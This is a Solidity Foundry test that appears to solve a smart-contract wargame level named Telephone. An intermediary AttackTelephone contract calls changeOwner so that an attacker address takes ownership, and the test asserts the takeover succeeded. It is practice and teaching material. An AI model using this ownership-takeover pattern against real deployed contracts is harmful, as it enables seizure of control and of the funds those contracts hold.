// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/04_Telephone.sol";

contract AttackTelephone {
    constructor(address _telephoneAddress){
        Telephone(_telephoneAddress).changeOwner(msg.sender);
    }
}

contract TelephoneTest is Test {
    Telephone _telephone;
    address deployer;
    address attacker;

    function setUp() public {
        deployer = address(this);
        attacker = vm.addr(1);

        _telephone = new Telephone();

    }

    function testSolution() public {
        vm.startPrank(attacker);

        new AttackTelephone(address(_telephone));

        assertEq(_telephone.owner(), attacker, "Attacker is not owner!");
    }
}
